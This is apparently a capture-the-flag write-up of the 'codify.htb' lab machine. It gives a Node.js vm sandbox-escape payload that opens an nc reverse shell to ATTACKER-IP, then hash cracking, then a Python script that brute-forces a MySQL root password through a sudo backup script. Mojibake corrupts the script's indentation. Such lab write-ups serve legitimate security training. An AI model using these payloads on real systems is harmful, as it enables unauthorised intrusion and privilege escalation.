Running our nmap scan we have

Navigating to port `80/HTTP` we have this

We can therefore add **codify.htb** to our `/etc/hosts` file

Navigating back to **codify.htb** we have this website

Clicking **Try it now** we have this **Node.js** sandbox as said earlier in the default page, so i tried out several payloads, but good enough this [blog](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html) helped me


![](https://i.imgur.com/KkuwgJv.png)


We can therefore get a reverse shell using the below payload (Make sure to replace **ATTACKER-IP** with your Ip address)


```bash
# on attacker machine
$ nc -lvnp 444

# on node.js editor

"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER-IP 4444 >/tmp/f').toString()`);
console.log(xyz);
```


We got shell as user `svc`

Navigating to `/var/www/contact` we have a file called `tickets.db` that contains user **joshua** hash (For better view use `strings` instead of `cat`)


![](https://i.imgur.com/oCS7otG.png)


We can then save this hash into a `.TXT` file on our attacker machine and attempt to crack it


![](https://i.imgur.com/j00477M.png)

We can therefore switch user to **joshua** with the `su` command

Running `sudo -l` we have permissions to run `/opt/scripts/mysql-backup.sh` with sudo permissions


![](https://i.imgur.com/hMeg5hn.png)


Concatenating this script we can see what it does


![](https://i.imgur.com/UV9OY5m.png)

Basically it asks us for a user `root` **Mysql** password and if it is correct grants us read permissions to the `/var/backups/mysql` backup directory, After several testing i found out a particular python script by someone ðŸ¤£ that literally bruteforce the **Mysql** password


```python
import string  
import subprocess  
  
all_characters_and_numbers = list(string.ascii_letters + string.digits)  
  
password = ""  
found = False  
  
while not found:  
Â  Â  for character in all_characters_and_numbers:  
Â Â Â Â Â Â Â  command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
Â Â Â Â Â Â Â  output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
Â Â Â Â Â Â Â  if "Password confirmed!" in output:  
Â Â Â Â Â Â Â Â Â Â Â  password += character  
Â Â Â Â Â Â Â Â Â Â Â  print(password)  
Â Â Â Â Â Â Â Â Â Â Â  break  
Â Â Â  else:  
Â Â Â Â Â Â Â  found = True
```

Which truly did gave us the password

We can just switch user to `root` with this password instead of login in via **Mysql**
